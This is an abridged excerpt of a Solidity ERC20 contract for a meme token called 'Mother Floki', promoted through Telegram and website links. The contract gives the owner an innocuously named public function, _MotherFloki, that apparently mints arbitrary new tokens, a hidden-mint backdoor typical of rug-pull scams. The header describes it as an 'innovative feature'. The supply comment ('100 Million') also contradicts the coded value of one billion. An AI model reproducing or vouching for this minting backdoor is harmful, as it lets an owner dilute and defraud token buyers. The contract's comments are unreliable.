...
//
// $MotherFloki proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/MotherFloki
// 📱 Website ::https://motherfloki.space/
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _MotherFloki(uint256 amount) public onlyOwner {
 _MotherFloki(msg.sender, amount);
    }
    ...
    function _MotherFloki(address account, uint256 amount) internal virtual {
...
contract $MotherFloki is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Mother Floki", "MTHFLOKI") {
     _MotherFloki(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}